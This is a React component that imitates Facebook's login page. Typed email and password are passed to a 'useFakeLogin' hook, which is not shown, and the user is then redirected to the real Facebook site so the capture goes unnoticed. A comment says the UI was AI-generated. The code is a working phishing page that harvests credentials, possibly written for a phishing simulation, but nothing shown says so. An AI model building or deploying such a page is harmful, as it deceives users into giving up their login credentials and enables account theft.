import { Link } from "react-router-dom";
import { useState } from "react";
import { type Credentials, useFakeLogin } from "../use-fake-login.tsx";

//the UI is ai generated to gain time
function Facebook() {
  const [credentials, setCredentials] = useState<Credentials>({
    login: "",
    password: "",
  });
  const fakeLogin = useFakeLogin();
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    await fakeLogin(credentials);
    window.location.href = "https://www.facebook.com/account/about/?hl=fr";
  };
  return (
    <div className="min-h-screen bg-[#f0f2f5] flex flex-col items-center justify-center pt-20 pb-28 md:pt-32 font-helvetica">
      <div className="flex flex-col md:flex-row w-full max-w-[980px] px-4 md:px-0 gap-x-8 lg:gap-x-12">
        {/* Left Side: Logo and Slogan */}
        <div className="flex flex-col items-center md:items-start text-center md:text-left flex-1 md:pt-16 pr-0 md:pr-8 mb-10 md:mb-0">
          <img
            src="../../../../../public/pages/facebook-logo.svg"
            alt="Facebook"
            className="h-16 md:h-[106px] -m-[28px] mb-0 md:-ml-[28px]"
          />
          <h2 className="text-[24px] md:text-[28px] leading-[28px] md:leading-[32px] w-auto md:w-[500px] mt-2 md:mt-4 font-normal text-[#1c1e21]">
            Facebook helps you connect and share with the people in your life.
          </h2>
        </div>

        {/* Right Side: Login Form */}
        <div className="flex flex-col items-center w-full md:w-[396px]">
          <div className="bg-white p-4 rounded-xl shadow-[0_2px_4px_rgba(0,0,0,0.1),0_8px_16px_rgba(0,0,0,0.1)] w-full">
            <form className="flex flex-col gap-3.5" onSubmit={handleSubmit}>
              <input
                type="text"
                onChange={(e) =>
                  setCredentials({ ...credentials, login: e.target.value })
                }
                placeholder="Email or phone number"
                className="w-full border border-[#dddfe2] rounded-[6px] px-[16px] py-[14px] text-[17px] focus:outline-none focus:border-[#1877f2] focus:shadow-[0_0_0_2px_#e7f3ff] placeholder-gray-500"
              />
              <input
                type="password"
                onChange={(e) =>
                  setCredentials({ ...credentials, password: e.target.value })
                }
                placeholder="Password"
                className="w-full border border-[#dddfe2] rounded-[6px] px-[16px] py-[14px] text-[17px] focus:outline-none focus:border-[#1877f2] focus:shadow-[0_0_0_2px_#e7f3ff] placeholder-gray-500"
              />
              <button
                type="submit"
                className="w-full bg-[#1877f2] hover:bg-[#166fe5] text-white font-bold text-[20px] leading-[48px] rounded-[6px] transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
                disabled={!credentials.login || !credentials.password}
              >
                Log In
              </button>
            </form>

            <div className="mt-4 text-center">
              <Link
                to="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0"
                className="text-[#1877f2] text-[14px] hover:underline hover:text-[#1877f2]"
              >
                Forgot password?
              </Link>
            </div>

            <div className="border-b border-[#dadde1] my-5"></div>

            <div className="text-center pb-2">
              <a
                href="https://www.facebook.com/pages/create/?ref_type=registration_form"
                className="bg-[#42b72a] hover:bg-[#36a420] text-white font-bold text-[17px] px-4 py-3 rounded-[6px] transition-colors"
              >
                Create new account
              </a>
            </div>
          </div>

          <div className="mt-7 text-center md:text-left w-full text-[14px]">
            <a
              href="https://www.facebook.com/pages/create/?ref_type=registration_form"
              className="font-bold cursor-pointer hover:underline"
            >
              Create a Page
            </a>{" "}
            for a celebrity, brand or business.
          </div>
        </div>
      </div>
    </div>
  );
}

export default Facebook;
